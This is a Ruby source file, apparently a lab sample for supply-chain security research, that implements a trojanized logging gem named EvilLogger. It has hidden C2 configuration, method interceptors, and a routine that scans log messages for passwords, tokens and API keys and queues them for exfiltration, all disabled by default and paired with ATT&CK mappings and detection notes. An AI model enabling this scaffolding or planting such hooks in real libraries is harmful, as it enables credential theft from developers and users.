# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1b -- EvilLogger: Trojanized Logging Gem
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
# DO NOT publish this gem or use it outside controlled lab environments.
#
# This gem demonstrates how a seemingly legitimate logging library can be
# trojanized to include hidden functionality. It provides real logging
# features while covertly:
#   1. Intercepting method calls on target classes
#   2. Collecting environment data (credentials, tokens, keys)
#   3. Calling back to a C2 server with exfiltrated data
#
# MITRE ATT&CK:
#   T1195.001 - Supply Chain Compromise: Compromise Software Dependencies
#   T1059.004 - Command and Scripting Interpreter
#   T1071.001 - Application Layer Protocol: Web Protocols
#
# DETECTION METHODS:
#   - Static analysis of gem source for network calls
#   - Monitor DNS/HTTP traffic during gem install and test phases
#   - Audit post_install_message and extconf.rb for code execution
#   - Compare gem source against public repository (typosquatting check)
#   - Use tools like bundler-audit, rubocop-supply_chain
# =============================================================================

require_relative 'evil_logger/version'
require_relative 'evil_logger/interceptor'
require_relative 'evil_logger/exfiltrator'

module EvilLogger
  # Configuration for the logger (legitimate functionality)
  class Configuration
    attr_accessor :log_level, :output, :formatter, :colorize,
                  :timestamp_format, :progname

    # Hidden configuration (malicious functionality -- EDUCATIONAL ONLY)
    attr_accessor :c2_host, :c2_port, :c2_path, :exfil_enabled,
                  :intercept_targets, :beacon_interval

    def initialize
      # Legitimate defaults
      @log_level = :info
      @output = $stdout
      @formatter = :default
      @colorize = true
      @timestamp_format = '%Y-%m-%d %H:%M:%S'
      @progname = 'EvilLogger'

      # Malicious defaults -- ALL DISABLED for safety
      # EDUCATIONAL: In a real attack, these would be enabled by default
      # and the C2 host would be an attacker-controlled server
      @c2_host = nil           # Set to nil = disabled
      @c2_port = 443
      @c2_path = '/api/log'
      @exfil_enabled = false   # Explicitly disabled
      @intercept_targets = []
      @beacon_interval = 300   # 5 minutes (if enabled)
    end
  end

  class << self
    attr_writer :configuration

    def configuration
      @configuration ||= Configuration.new
    end

    def configure
      yield(configuration)
    end

    def reset_configuration!
      @configuration = Configuration.new
    end
  end

  # Main logger class providing legitimate logging functionality
  # with hidden trojan capabilities (all disabled by default).
  class Logger
    LEVELS = { debug: 0, info: 1, warn: 2, error: 3, fatal: 4 }.freeze
    COLORS = { debug: "\e[36m", info: "\e[32m", warn: "\e[33m",
               error: "\e[31m", fatal: "\e[35m", reset: "\e[0m" }.freeze

    attr_reader :config, :log_buffer, :interceptor, :exfiltrator

    def initialize(config: nil)
      @config = config || EvilLogger.configuration
      @log_buffer = []
      @mutex = Mutex.new

      # Initialize hidden components (disabled by default)
      @interceptor = Interceptor.new(targets: @config.intercept_targets)
      @exfiltrator = Exfiltrator.new(
        host: @config.c2_host,
        port: @config.c2_port,
        enabled: @config.exfil_enabled
      )

      # EDUCATIONAL: A real trojan would start the beacon thread here
      # start_beacon_thread if @config.c2_host
      log_internal(:debug, 'EvilLogger initialized')
    end

    # --- Legitimate logging API ---

    LEVELS.each_key do |level|
      define_method(level) do |message = nil, &block|
        message = block.call if block && message.nil?
        log(level, message)
      end
    end

    # Log a message at the specified level.
    #
    # @param level [Symbol] Log level (:debug, :info, :warn, :error, :fatal)
    # @param message [String] Log message
    def log(level, message)
      return unless should_log?(level)

      entry = format_entry(level, message)

      @mutex.synchronize do
        @log_buffer << entry
        write_output(entry)
      end

      # EDUCATIONAL: Hidden exfiltration trigger
      # In a real trojan, certain log messages might trigger data collection
      # e.g., messages containing "password", "token", "key", "secret"
      check_sensitive_content(message) if @config.exfil_enabled

      entry
    end

    # Install method interception on target classes.
    #
    # EDUCATIONAL: This is the trojan's main infection vector. When called
    # (typically from an initializer or Railtie), it patches target classes
    # to intercept interesting method calls.
    #
    # In a real attack, this would be hidden inside legitimate-looking
    # setup code like `EvilLogger.setup_rails_integration`.
    def install_interceptors!
      return unless @config.intercept_targets.any?

      @interceptor.install_all!
      log_internal(:debug, "Interceptors installed on #{@config.intercept_targets.length} targets")
    end

    # Flush the log buffer to output.
    def flush
      @mutex.synchronize do
        @log_buffer.clear
      end
    end

    # Return current log statistics.
    def stats
      {
        buffer_size: @log_buffer.length,
        level: @config.log_level,
        output: @config.output.class.name,
        interceptors_active: @interceptor.active_count,
        exfil_enabled: @config.exfil_enabled
      }
    end

    private

    def should_log?(level)
      LEVELS.fetch(level, 0) >= LEVELS.fetch(@config.log_level, 0)
    end

    def format_entry(level, message)
      timestamp = Time.now.strftime(@config.timestamp_format)
      prefix = "[#{timestamp}] [#{@config.progname}] [#{level.upcase}]"

      if @config.colorize
        color = COLORS.fetch(level, '')
        reset = COLORS[:reset]
        "#{color}#{prefix}#{reset} #{message}"
      else
        "#{prefix} #{message}"
      end
    end

    def write_output(entry)
      case @config.output
      when IO, StringIO
        @config.output.puts(entry)
      when String
        File.open(@config.output, 'a') { |f| f.puts(entry) }
      end
    rescue IOError, Errno::ENOENT => e
      $stderr.puts "[EvilLogger] Output error: #{e.message}"
    end

    # EDUCATIONAL: Sensitive content detection for exfiltration trigger.
    # This demonstrates how trojans monitor data flowing through legitimate
    # APIs to identify and collect sensitive information.
    def check_sensitive_content(message)
      return if message.nil?
      return unless @config.exfil_enabled # Safety: disabled by default

      sensitive_patterns = [
        /password\s*[=:]/i,
        /api[_-]?key\s*[=:]/i,
        /token\s*[=:]/i,
        /secret\s*[=:]/i,
        /auth/i,
        /bearer\s+\S+/i,
        /AWS_/i
      ]

      if sensitive_patterns.any? { |pat| message.match?(pat) }
        @exfiltrator.queue_data(
          type: :sensitive_log,
          content: message,
          timestamp: Time.now.utc.iso8601
        )
      end
    end

    def log_internal(level, message)
      return unless LEVELS.fetch(level, 0) >= LEVELS.fetch(@config.log_level, 0)
      @log_buffer << "[INTERNAL] #{message}"
    end
  end
end
